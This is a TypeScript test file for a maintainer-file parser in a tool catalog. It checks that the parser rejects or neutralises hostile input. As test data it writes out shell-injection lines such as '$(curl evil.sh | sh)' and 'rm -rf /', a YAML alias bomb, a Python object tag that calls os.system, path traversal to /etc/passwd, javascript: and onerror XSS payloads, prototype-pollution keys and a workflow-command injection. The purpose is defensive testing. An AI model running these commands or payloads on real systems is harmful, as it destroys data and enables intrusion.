import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { claimedSlugs } from "../scripts/lib/facts.ts";
import { isSafePath, MAINTAINER_FILE_BYTES, type MaintainerFile, parseMaintainerFile, printable } from "../scripts/lib/maintainer-file.ts";

function reason(file: MaintainerFile): string {
  assert.equal(file.form, "rejected");
  return file.form === "rejected" ? file.reason : "";
}

const RICHER = `tools:
  ripgrep:
    path: crates/rg
    deploy: [binary, package]
    capabilities:
      ci:
        docs: https://example.com/docs/ci
    migration:
      ack: https://example.com/migrate-from-ack
    replaces:
      - tool: the-silver-searcher
        fit: full
        note: Respects .gitignore like ag.
    category: code-search
  rg-extra:
`;

describe("parseMaintainerFile", () => {
  it("keeps reading today's one slug per line, with comments", () => {
    assert.deepEqual(parseMaintainerFile("# ours\nferrflow\n\n  lfsx  # the LFS server\r\n"), { form: "lines", slugs: ["ferrflow", "lfsx"] });
    assert.deepEqual(claimedSlugs("ferrflow\n"), ["ferrflow"]);
  });

  it("reads a YAML mapping with tools as the richer form, every key a claimed slug and every field kept", () => {
    const file = parseMaintainerFile(RICHER);
    assert.equal(file.form, "fields");
    if (file.form !== "fields") return;
    assert.deepEqual(file.slugs, ["ripgrep", "rg-extra"]);
    assert.deepEqual(file.tools.get("rg-extra"), {});
    assert.deepEqual(file.tools.get("ripgrep"), {
      path: "crates/rg",
      deploy: ["binary", "package"],
      capabilities: { ci: { docs: "https://example.com/docs/ci" } },
      migration: { ack: "https://example.com/migrate-from-ack" },
      replaces: [{ tool: "the-silver-searcher", fit: "full", note: "Respects .gitignore like ag." }],
      category: "code-search",
    });
    assert.deepEqual(claimedSlugs(RICHER), ["ripgrep", "rg-extra"]);
  });

  it("never claims a line that is not a slug, so shell metacharacters go nowhere", () => {
    assert.deepEqual(claimedSlugs("ferrflow\n$(curl evil.sh | sh)\nfd; rm -rf /\n`id`\nok-tool\n"), ["ferrflow", "ok-tool"]);
  });

  it("refuses the whole richer file when a key is not a slug, including the slugs it vouches for", () => {
    const hostile = "tools:\n  ferrflow: {}\n  \"$(rm -rf /)\": {}\n";
    assert.match(reason(parseMaintainerFile(hostile)), /schema: \/tools/);
    assert.deepEqual(claimedSlugs(hostile), []);
  });

  it("ignores a file past the size cap as a whole, even in the line form", () => {
    const oversized = `ferrflow\n${"#".repeat(MAINTAINER_FILE_BYTES)}\n`;
    assert.match(reason(parseMaintainerFile(oversized)), /larger than 16384 bytes/);
    assert.deepEqual(claimedSlugs(oversized), []);
  });

  it("refuses an alias bomb before expanding anything", () => {
    const bomb = [
      "a: &a [x, x, x, x, x, x, x, x, x]",
      "b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]",
      "c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]",
      "d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]",
      "tools:",
      "  ferrflow: *d",
    ].join("\n");
    assert.match(reason(parseMaintainerFile(bomb)), /anchor|alias/);
    assert.deepEqual(claimedSlugs(bomb), []);
  });

  it("refuses an anchor even when nothing points at it", () => {
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow: &x {}\n")), /anchor/);
  });

  it("refuses custom and language-specific tags", () => {
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow: !!python/object:os.system {}\n")), /YAML/);
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    path: !include /etc/passwd\n")), /YAML/);
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    path: !!str crates\n")), /explicit YAML tag/);
  });

  it("refuses a file that looks like the richer form but is not valid YAML", () => {
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow: {}\n  ferrflow: {}\n")), /not valid YAML \(DUPLICATE_KEY\)/);
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow: [\n")), /not valid YAML/);
  });

  it("refuses a path that leaves the repository or is not normalised", () => {
    for (const path of ["../../", "../etc", "crates/../../x", "/etc/passwd", "crates\\rg", "./crates", "crates//rg", "crates/"]) {
      const file = parseMaintainerFile(`tools:\n  ferrflow:\n    path: ${JSON.stringify(path)}\n`);
      assert.equal(file.form, "rejected", path);
    }
  });

  it("refuses links that are not plain https", () => {
    for (const url of ["http://example.com", "javascript:alert(1)", "https://user:secret@example.com/docs", "https://example.com/<script>"]) {
      const file = parseMaintainerFile(`tools:\n  ferrflow:\n    migration:\n      ack: ${JSON.stringify(url)}\n`);
      assert.equal(file.form, "rejected", url);
    }
  });

  it("refuses fields the catalog reads from GitHub, and values outside the enums", () => {
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    stars: 100000\n")), /additional properties \(stars\)/);
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    deploy: [docker]\n")), /schema/);
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    replaces:\n      - tool: jira\n        fit: perfect\n")), /schema/);
    assert.match(reason(parseMaintainerFile("tools: {}\nversion: 2\n")), /schema/);
  });

  it("keeps a note with markdown and HTML as plain text, and refuses one with control characters or past the cap", () => {
    const html = "tools:\n  ferrflow:\n    replaces:\n      - tool: jira\n        fit: full\n        note: \"[x](javascript:1) <img src=x onerror=alert(1)> # h\"\n";
    const file = parseMaintainerFile(html);
    assert.equal(file.form, "fields");
    if (file.form === "fields") assert.equal(file.tools.get("ferrflow")?.replaces?.[0]?.note, "[x](javascript:1) <img src=x onerror=alert(1)> # h");
    assert.match(reason(parseMaintainerFile("tools:\n  ferrflow:\n    affiliation: \"line\\n---\\ntitle: x\"\n")), /schema/);
    assert.match(reason(parseMaintainerFile(`tools:\n  ferrflow:\n    affiliation: ${"a".repeat(201)}\n`)), /schema/);
  });

  it("refuses keys that would reach an object's prototype", () => {
    assert.equal(parseMaintainerFile("tools:\n  __proto__: {}\n").form, "rejected");
    assert.equal(parseMaintainerFile("tools:\n  ferrflow:\n    capabilities:\n      __proto__:\n        docs: https://example.com\n").form, "rejected");
  });
});

describe("isSafePath", () => {
  it("accepts a relative, normalised path and nothing else", () => {
    assert.equal(isSafePath("crates/rg"), true);
    assert.equal(isSafePath("../x"), false);
    assert.equal(isSafePath("a/./b"), false);
    assert.equal(isSafePath("/a"), false);
    assert.equal(isSafePath("a\\b"), false);
  });
});

describe("printable", () => {
  it("keeps a logged value on one line, so it cannot open a workflow command", () => {
    assert.equal(printable("a\n::set-output name=x::y"), "a?::set-output name=x::y");
    assert.equal(printable("x".repeat(100), 10), "xxxxxxxxxx...");
  });
});
